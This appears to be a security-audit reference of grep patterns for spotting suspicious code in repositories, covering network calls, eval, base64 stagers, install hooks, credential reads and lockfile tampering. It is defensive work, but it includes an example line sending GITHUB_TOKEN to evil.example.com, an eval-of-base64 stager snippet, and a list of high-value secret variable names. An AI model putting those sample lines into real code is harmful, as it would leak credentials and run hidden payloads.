# Suspicious Pattern Reference

Complete grep patterns for each risk category. Run against all source files,
excluding `node_modules/`, `dist/`, `__pycache__/`, `.git/`.

---

## 1. Outbound Network

### Node.js / JavaScript
```bash
grep -rn -E \
  "(fetch\(|http\.|https\.|net\.connect|net\.createConnection|dgram\.|XMLHttpRequest|WebSocket\()" \
  src/ --include="*.ts" --include="*.js" --include="*.mjs"
```

```bash
# Popular HTTP libraries
grep -rn -E \
  "(require\(['\"]axios['\"]|require\(['\"]got['\"]|require\(['\"]node-fetch['\"]|require\(['\"]undici['\"]|import.*from ['\"]axios|import.*from ['\"]got|import.*from ['\"]undici)" \
  src/
```

### Python
```bash
grep -rn -E \
  "(requests\.(get|post|put|delete|patch|head|session)|urllib\.(request|urlopen)|httpx\.|aiohttp\.|socket\.)" \
  --include="*.py" .
```

### Ruby
```bash
grep -rn -E \
  "(Net::HTTP|open-uri|Faraday|HTTParty|RestClient|Typhoeus|Excon)" \
  --include="*.rb" .
```

### Rust
```bash
grep -rn -E \
  "(reqwest::|hyper::|ureq::|attohttpc::|isahc::)" \
  --include="*.rs" src/
```

---

## 2. Dynamic Code Execution

### Node.js / JavaScript
```bash
grep -rn -E \
  "(eval\(|new Function\(|vm\.runIn|require\([^'\"a-zA-Z]|import\([^'\"a-zA-Z])" \
  src/ --include="*.ts" --include="*.js"
```

```bash
# child_process — note: execFileSync with args array is safer than exec with string
grep -rn -E \
  "(child_process|exec\(|execSync\(|spawn\(|spawnSync\(|fork\()" \
  src/ --include="*.ts" --include="*.js"
```

> **Triage**: for each `exec`/`spawn` hit, check if:
> - `execFile`/`execFileSync` is used (safer — no shell interpolation)
> - Arguments are passed as an **array** (not a template string)
> - The binary called is hardcoded (e.g., `'git'`) vs dynamic

### Python
```bash
grep -rn -E \
  "(eval\(|exec\(|__import__\(|importlib\.import_module|subprocess\.(run|call|Popen|check_output)|os\.system\(|os\.popen\()" \
  --include="*.py" .
```

### Rust
```bash
grep -rn -E \
  "(std::process::Command|Command::new)" \
  --include="*.rs" src/
```

---

## 3. Obfuscation / Decode-then-Execute

```bash
# Node.js / JavaScript
grep -rn -E \
  "(atob\(|btoa\(|Buffer\.from\(.*['\"]base64['\"]|toString\(['\"]base64['\"])" \
  src/ --include="*.ts" --include="*.js"
```

```bash
# Python
grep -rn -E \
  "(base64\.b64decode|base64\.decodebytes|codecs\.decode.*base64|\.decode\(['\"]base64['\"])" \
  --include="*.py" .
```

Look for patterns like:
```js
// Classic stager
eval(Buffer.from('aGVsbG8...', 'base64').toString())
const fn = new Function(atob('ZnVuY3Rpb24…'))
```

---

## 4. Telemetry / Analytics / Tracking

```bash
grep -rni -E \
  "(telemetry|analytics|posthog|sentry\.io|mixpanel|amplitude|segment\.io|datadog|beacon\(|\.track\(|\.identify\(|\.capture\(|\.alias\()" \
  src/ --include="*.ts" --include="*.js" --include="*.py"
```

Also check for CI-only telemetry that runs in GitHub Actions environments:
```bash
grep -rni -E \
  "(GITHUB_ACTIONS|CI=true|process\.env\.CI)" \
  src/ --include="*.ts" --include="*.js"
```
Cross-reference with any network calls that only trigger when `CI` is set.

---

## 5. Filesystem Writes (destination assessment)

```bash
# Node.js
grep -rn -E \
  "(writeFile|writeFileSync|appendFile|appendFileSync|mkdirSync|mkdir\()" \
  src/ --include="*.ts" --include="*.js"
```

```bash
# Python
grep -rn -E \
  "(open\(.*['\"]w['\"]|open\(.*['\"]a['\"]|shutil\.(copy|move|copytree)|os\.(makedirs|mkdir))" \
  --include="*.py" .
```

For each write, evaluate the **destination path**:
- ✅ Writes inside `process.cwd()`, project root, or explicit config dir (`.ctxharness/`) — normal
- ⚠️ Writes to `os.homedir()`, `~`, `$HOME`, user config dirs — requires explanation
- 🔴 Writes to `/tmp`, `/usr`, `/etc`, system paths — highly suspicious
- 🔴 Path built from env var or user input without sanitisation — path traversal risk

---

## 6. Credential / Environment Harvesting

```bash
# Node.js — reading env vars
grep -rn -E \
  "process\.env\." \
  src/ --include="*.ts" --include="*.js"
```

```bash
# Python
grep -rn -E \
  "(os\.environ|os\.getenv)" \
  --include="*.py" .
```

Flag any code that **combines** an env-var read with a network call in the same
function or file. Common exfiltration pattern:
```js
const token = process.env.GITHUB_TOKEN
fetch('https://evil.example.com/collect?t=' + token)
```

Known high-value env var names to search explicitly:
```
GITHUB_TOKEN  NPM_TOKEN  PYPI_TOKEN  AWS_ACCESS_KEY  AWS_SECRET
GH_TOKEN  HOMEBREW_GITHUB_API_TOKEN  SSH_AUTH_SOCK
```

---

## 7. Install-time Hooks

### npm
```bash
cat package.json | jq '.scripts | to_entries[] | select(.key | test("install|prepare|prepack|postpack|prepublish"))'
```

Any non-empty lifecycle script that is not `tsc`, `build`, or a well-known
build tool → read its content carefully.

### pip
```bash
grep -n -E \
  "(cmdclass|setup_requires|install_requires.*subprocess|entry_points.*console_scripts)" \
  setup.py pyproject.toml
```

Also check for `__init__.py` that runs code at import time via top-level
side effects.

### Rust (build.rs)
If `build.rs` exists, read it entirely — it runs at compile time with full
system access.

---

## 8. Binary Blobs in Source

```bash
# Files that shouldn't be in source
find . -name "*.node" -o -name "*.so" -o -name "*.dylib" -o -name "*.dll" \
       -o -name "*.wasm" -o -name "*.pyc" \
       | grep -v node_modules | grep -v dist | grep -v build
```

Pre-built binaries committed to source bypass code review entirely. Always check:
- What does the binary do? (`file`, `strings`, `nm`)
- Is there a build script that reproduces it from source?
- Does the README explain why it's pre-compiled?

---

## 9. Lock File Integrity

### npm / pnpm
```bash
# Confirm all deps resolve to expected registries (no private mirror substitution)
grep -E "resolved \"https://" pnpm-lock.yaml | \
  grep -v "registry.npmjs.org\|registry.yarnpkg.com" | head -20
```

Any package resolving from a non-standard registry is suspicious.

### pip
```bash
grep -E "^[^#]" poetry.lock | grep -v "pypi.org" | head -20
```

---

## 10. Repo vs Published Package Divergence

If you have access to the npm tarball:
```bash
# Unpack published tarball
npm pack <package>@<version>
tar -tzf <package>-<version>.tgz | sort > published-files.txt

# Compare with repo tree
git -C <repo> ls-files | sort > repo-files.txt

diff repo-files.txt published-files.txt
```

Files present in the tarball but **absent from the repo** (especially compiled
`.js` files without corresponding `.ts` sources) deserve close inspection.
